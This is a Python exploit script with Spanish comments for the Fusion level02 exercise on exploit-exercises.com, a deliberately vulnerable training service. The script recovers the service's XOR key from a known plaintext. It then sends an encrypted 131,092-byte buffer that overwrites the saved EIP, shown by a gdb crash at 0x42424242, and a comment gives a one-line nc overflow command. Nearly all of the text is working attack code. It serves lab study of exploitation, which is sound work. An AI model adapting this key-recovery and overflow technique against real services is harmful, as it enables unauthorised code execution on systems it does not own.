# Ejercicio Fusion 02 : exploit-exercices.com
# Este codigo sirve como prueba de concepto del control de EIP  
# Fuente de gran parte del codigo es de:
# http://www.kroosec.com/2013/03/fusion-level02.html
# Una vez ejecutado se recibira el siguiente mensaje:
# gdb$ attach 4140 
# gdb$ c
# [New process 4670]
# Program received signal SIGSEGV, Segmentation fault.
# [Switching to process 4670]
# --------------------------------------------------------------------------[regs]
#   EAX: 0x00000051  EBX: 0xB77D0FF4  ECX: 0xBFD0961B  EDX: 0x00000001  o d I t s Z a P c 
#   ESI: 0x00000000  EDI: 0x00000000  EBP: 0x41414141  ESP: 0xBFD29630  EIP: 0x42424242
#   CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007BError while running hook_stop:
# Cannot access memory at address 0x42424242
# 0x42424242 in ?? ()
# gdb$ 

import socket
import time
from time import sleep
from struct import pack

# Nota:
# Provocamos el overflow: python -c 'print "E"+"\x14\x00\x02\x00"+131088*"A"+4*"B"+"Q"' | nc localhost 20002
# Funcion que cifra un texto con XOR
# @text: texto que se va a cifrar
# @key: clave con la que se va a hacer el XOR del texto
# @keysize: tamano de la clave

def encrypt(text, key, keysize):
    return "".join([chr(ord(x) ^ ord(key[ i % keysize])) for i, x in enumerate(text)])


# Funcion que aplica un XOR entre dos strings : s1 ^ s2  
# @a: String para aplicar la funcion XOR  
# @b: String para aplicar la funcion XOR

def xorstr(a, b):
    if len(a) > len(b):
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
    else:
        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])

############
# MAIN
############

HOST = 'localhost'    # The remote host
PORT = 20002             # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
sleep(0.5)
s.recv(1024)

##############################################################
# Paso 1 
# Objetivo: Ciframos 128 bytes y obtenemos la key
# Se elige cifrar 128 bytes porque este el tamano de la clave
#############################################################

# La clave de 32 elementos de 4 bytes cada elemento. 32 x 4 = 128 bytes
keysize = 128
# El tamano en Little Endian
size_buffer = pack("<L",128)
# Rellenamos el buffer 128 A's
data_buffer = 128*"A"
# Construimos el payload a enviar
payload = "E"+size_buffer+data_buffer
s.sendall(payload)
sleep(0.5)
# Recibimos el resultado de cifrar el mensaje
result = s.recv(2048)
# Recogemos los 128 bytes cifrados
cifrado = result[-keysize:]
# Obtenemos la clave de 128 bytes
key = xorstr(data_buffer,cifrado)

# Se comprueba que la clave este correcta
if len(key) != keysize or key.find("encryption") != -1:
    print "Key extraction fail."
    exit(1)

##############################################################################
# Paso 2
# Objetivo: provocamos el overflow, pero con los datos cifrados con la clave 
# de manera que cuando el programa le aplique el XOR tendremos lo que queremos 
# inyectar
##############################################################################

# Preparamos el payload a inyectar
eip = 4*"B"
size_buf = 131092 # 0x00020014
size_buf_le = pack("<L",size_buf) # Hacemos el LE del entero
datos = 131088 * "A" + eip 
datos_cifrados = encrypt(datos,key,keysize) 
payload = "E"+size_buf_le+datos_cifrados+"Q"

# Enviamos el payload
s.sendall(payload)
# Delay  
sleep(0.5)
s.close()
